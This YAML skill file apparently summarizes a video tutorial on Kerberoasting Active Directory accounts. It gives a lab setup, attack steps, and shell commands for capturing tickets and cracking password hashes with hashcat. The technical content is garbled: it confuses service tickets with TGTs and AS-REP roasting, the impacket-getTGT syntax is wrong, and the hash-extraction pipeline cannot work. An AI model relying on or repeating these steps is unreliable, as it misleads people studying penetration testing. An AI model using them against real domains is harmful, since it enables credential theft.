---
name: kerberosting-attack
description: Learn how to perform Kerberos roasting attacks on an Active Directory environment.
version: 1.0
category: security
source: https://youtu.be/tRCvagjqx3c
tags:
  - cybersecurity
  - penetration testing
  - active directory
  - kerberos
  - roasting

body: |
  ## Overview
  In this video, we will demonstrate a well-known and super common technique called Kerberosting. This attack should absolutely be in your arsenal because it's used on practically every internal penetration test.

  ## Setup Review
  We have a simple Active Directory environment set up with:
  - A domain controller virtual machine.
  - A management client outside the domain that allows us to configure and set up our AD environment from the outside.
  - Kali Linux as our attacker machine, which is set up with a GitHub repository containing notes and scripts.

  ## Creating a Random Domain
  We use PowerShell scripts to automatically generate a fully random domain for experimentation. This includes:
  - Different users
  - Local admin groups
  - Default passwords that need to be changed

  ## Kerberos Roasting Attack
  Kerberos roasting is an attack where an attacker captures a TGT (Ticket Granting Ticket) and attempts to crack the hash of the user's password. This can be done using tools like `hashcat` or `john`.

  ### Steps:
  1. **Capture TGT**: Use `impacket-getTGT` to capture a TGT for a user.
     ```bash
     impacket-getTGT -dc-ip <domain_controller_ip> -user <username> -password <password>
     ```
  2. **Extract Hash**: Extract the hash from the captured TGT.
  3. **Crack Hash**: Use `hashcat` or `john` to crack the hash.

  ### Example:
  ```bash
  # Capture TGT
  impacket-getTGT -dc-ip 192.168.1.100 -user john.doe -password P@ssw0rd

  # Extract hash (usually from a file)
  cat john.doe.ccache | grep 'AS-REP' | awk '{print $4}' > john.doe.hash

  # Crack hash with hashcat
  hashcat -m 13100 john.doe.hash /path/to/wordlist.txt
  ```

  ## Conclusion
  Kerberosting is a powerful technique for attacking Active Directory environments. By capturing and cracking TGTs, attackers can gain unauthorized access to user accounts. Always ensure you have proper authorization before performing any penetration testing.

  For more detailed information, refer to resources like [adsecurity.org](https://adsecurity.org).